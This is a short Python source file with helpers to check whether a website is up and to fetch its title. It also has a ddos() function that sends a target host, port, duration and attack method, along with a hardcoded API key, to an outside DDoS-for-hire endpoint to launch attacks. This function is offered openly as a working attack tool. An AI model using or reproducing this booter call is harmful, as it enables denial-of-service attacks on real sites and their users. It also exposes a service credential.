import requests
from bs4 import BeautifulSoup

def isItUp(website):
    if website.startswith("http://") or website.startswith("https://"):
        pass
    else:
        website = "http://%s"%website

    try:
        request = requests.get(website)
    except:
        return "[-] %s is currently down!"%website

    if request.status_code < 210:
        return "[+] %s is currently up!"%website
    else:
        return "[-] %s is currently down!"%website

def websiteTitle(website):
    try:
        request = requests.get(website)
        bs = BeautifulSoup(request.text)
        return bs('title')[0].text.encode('utf-8')
    except: return None


def ddos(target, port, time, method):
    lel = requests.get("http://reimhosting.com/ddos/api1.php", params={'key': '06d4296ba37e536ee634a2bebe254152', 'host': target, 'port': port, 'time': time, 'method': method,})
    if "send" in lel.text:
        return "[+] Attack sent successfully!"
    else:
        return "[!] Error sending attack..."